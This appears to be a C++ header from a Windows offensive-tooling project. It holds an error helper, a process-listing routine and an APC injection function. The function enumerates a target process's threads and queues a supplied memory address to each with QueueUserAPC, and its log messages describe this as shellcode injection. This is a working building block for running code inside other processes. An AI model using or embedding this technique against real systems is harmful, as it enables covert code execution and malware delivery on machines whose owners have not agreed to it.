#pragma once
/*****************************************************************//**
 * file   Basic_func.h
 * author Leviathan
 * date   November 2022
 * brief  Basic Function header file
 *********************************************************************/

#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>

// modified by source: https://msdn.microsoft.com/en-us/library/windows/desktop/ms680582(v=vs.85).aspx
void ExitShowError(const wchar_t* lpszFunction){
	
	LPVOID lpMsgBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0,
		NULL
	);

	// Display the error msg and exit the process
	wprintf_s(L"[-] %s failed with error code 0x%x: %s", lpszFunction, dw, lpMsgBuf);

	LocalFree(lpMsgBuf);
	ExitProcess(dw);
}

BOOL InjectAPCbyPID(DWORD PID, LPVOID lpBaseAddress) {
	
	DWORD tid = 0;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);


	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);

	if (snapshot == INVALID_HANDLE_VALUE) {
		ExitShowError(TEXT("CreateToolhelp32Snapshot"));
	}

	if (Thread32First(snapshot, &threadEntry) == TRUE)
	{
		// Get the thread snapshot
		while (Thread32Next(snapshot, &threadEntry) == TRUE)
		{
			if (threadEntry.th32OwnerProcessID == PID)
			{
				std::cout << "[+] Found thread in target process PID: "<< PID << std::endl;
				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
				tid = threadEntry.th32ThreadID;
				if (!hThread) {
					ExitShowError(TEXT("OpenThread"));
					continue;
				}
				
				// insert lpBaseAddress in APC queue :-)
				if (!QueueUserAPC((PAPCFUNC)lpBaseAddress, hThread, NULL)) {
					std::cout << "[-] QueueUserAPC error, trying next thread..." << std::endl;
				}
				else
				{
					std::cout << "[+] Shellcoded injected via QueueUserAPC" << std::endl;
					CloseHandle(hThread);
				}	
			}
		}
		if (!tid) {
			std::cout << "[-] No threads were found in target process" << std::endl;
			CloseHandle(snapshot);
			return FALSE;
		}
	} else {
		ExitShowError(TEXT("Thread32First"));
	}

	CloseHandle(snapshot);
	return TRUE;
}

void showProcess(){
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if ((DWORD)snapshot < 1) {
		ExitShowError(TEXT("CreateToolhelp32Snapshot"));
	}

	if (Process32First(snapshot, &processEntry) == TRUE)
	{
		while (Process32Next(snapshot, &processEntry) == TRUE)
		{
			wprintf(L"%u \t\t %s\t\n", processEntry.th32ProcessID, processEntry.szExeFile);
		}
		
	} else {
		ExitShowError(TEXT("Process32Frist"));
	}
	CloseHandle(snapshot);
}
